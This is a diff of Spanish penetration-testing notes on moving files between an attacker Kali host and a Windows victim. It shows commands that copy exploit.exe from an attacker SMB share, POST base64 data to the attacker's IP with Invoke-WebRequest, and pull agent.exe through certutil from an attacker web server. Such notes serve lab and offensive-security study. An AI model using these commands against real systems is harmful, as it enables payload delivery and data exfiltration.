@@ -112,7 +112,7 @@ cat <&3
 ```
 
 
-
+c
 # Windows
 ![[Pasted image 20250815002022.png]]
 ## SMB
@@ -156,7 +156,7 @@ New-PSDrive -Name "N" -Root "\\[IP_MAQUINA]\SHARE" -PSProvider "FileSystem" -Cre
 Después de levantarlo usamos:
 #Maquina_victima_Windows 
 ```cmd
-copy \\[KALI_IP]\SHARE\exploit.exe C:\Users\Public\exploit.exe
+copy \\[KALI_IP]\share\exploit.exe C:\Users\Public\exploit.exe
 ```
 
 Para cerrar la conexión lo haremos con:
@@ -304,6 +304,7 @@ O
 xfreerdp /v:[IP] /d:[DOMINIO] /u:[USUARIO] /p:'[CONTRASEÑA]' /drive:linux,/home/user/rdesktop/files
 ```
 Si no se usa dominio se puede quitar esta flag
+Y para mejorar el como se ve de resolucion poner `/dynamic-resolution`
 
 #Maquina_victima_Windows 
 Accedemos a esta carpeta desde un explorador de archivos y poniendo: `\\tsclient\`
@@ -379,12 +380,12 @@ Invoke-WebRequest -Uri http://[IP_KALI]:8000/ -Method POST -Body $b64
 ## Certutil
 #Maquina_atacante
 ```
-python3 -m http.server 80 
+python3 -m http.server 8080
 ```
 
 #Maquina_victima_Windows 
 ```CMD
-certutil.exe -verifyctl -split -f http://[IP]:[PUERTO]/nc.exe
+certutil.exe -urlcache -split -f http://[IP_KALI]:8080/agent.exe agent.exe
 ```
 
 # Fileless Downloads Attacks
